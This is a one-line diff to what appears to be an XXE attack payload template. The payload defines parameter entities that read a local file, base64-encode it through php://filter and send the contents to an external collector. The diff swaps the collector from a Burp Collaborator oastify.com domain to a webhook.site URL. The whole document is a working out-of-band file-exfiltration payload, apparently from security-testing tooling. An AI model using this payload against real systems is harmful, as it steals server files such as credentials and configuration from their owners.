@@ -1,1 +1,1 @@
-<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource={path}">\n<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://of7qz0dkpah7966qzbqvz6nau10sokc9.oastify.com/poc.dtd?%data;'>">
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource={path}">\n<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://webhook.site/6e53e15d-268a-4d9e-9e1d-3f57b2726c64/poc.dtd?%data;'>">
